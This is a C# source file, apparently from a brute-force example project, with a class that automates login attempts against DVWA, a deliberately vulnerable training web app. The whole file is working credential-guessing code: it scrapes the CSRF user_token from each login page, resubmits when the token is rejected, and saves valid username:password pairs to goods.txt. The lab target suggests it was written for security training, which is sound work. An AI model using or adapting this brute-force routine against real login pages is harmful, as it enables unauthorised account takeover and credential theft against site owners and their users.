using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Text.RegularExpressions;

using System.Net;
using System.Net.Http;
using Example_BruteForce;
using System.Windows.Forms;

namespace Example1_BruteForce
{
    class dvwaAuth
    {
        RichTextBox Output;

        public dvwaAuth(RichTextBox richTextBox1)
        {
            Output = richTextBox1;
        }
        ~dvwaAuth()
        {

        }

        private static readonly HttpClient client = new HttpClient();

        Regex PatternToken = new Regex("name='user_token'(\\s+)value='([^']+)'");
        Regex failPass = new Regex("Login failed");
        Regex failCSRF = new Regex("CSRF token is incorrect");
        Regex goodAuth = new Regex("You have logged in as");



        private async Task<int> POST(string link, Dictionary<string, string> values)
        {
            int status = 0;
            var content = new FormUrlEncodedContent(values);

            var response = await client.PostAsync(link, content);

            string responseString = /*await response.Result.Content.ReadAsStringAsync();*/await response.Content.ReadAsStringAsync();
            //MessageBox.Show(responseString);
            if (failPass.IsMatch(responseString))
            {
                //Log("");
                //System.IO.File.AppendAllText("bads.txt", values["username"] + ":" + values["password"] + "\r\n");
            }
            else
            {
                if (failCSRF.IsMatch(responseString))
                {
                    Program.Log(Output, "Token is incorrect");
                    status = await GET_POST(link, values);
                }
                else if (goodAuth.IsMatch(responseString))
                {
                    status = 1;
                    System.IO.File.AppendAllText("goods.txt", values["username"] + ":" + values["password"] + "\r\n");
                    //System.IO.File.AppendAllText("debug.txt", "user_token=" + values["user_token"] + "\r\n" + responseString + "\r\n");
                }
                else
                {
                    Program.Log(Output, "Other problem");
                }
            }
            //System.IO.File.AppendAllText("debug.txt", "user_token=" + values["user_token"] + "\r\n" + responseString + "\r\n");

            return status;
        }

        private async Task<int> GET_POST(string link, Dictionary<string, string> values)
        {

            var responseString = await client.GetStringAsync(link);
            //System.IO.File.AppendAllText("test.txt", "user_token=" + values["user_token"] + "\r\n" + responseString + "\r\n");
            values["user_token"] = PatternToken.Match(responseString).Groups[2].ToString();

            return await POST(link, values);
        }

        public async Task<int> Login(string url, string user, string pass)
        {
            var values = new Dictionary<string, string>
                    {
                        { "username", user },
                        { "password", pass},
                        { "Login", "Login" },
                        { "user_token", "" }
                    };
            return await this.GET_POST(url, values);
        }
    }
}
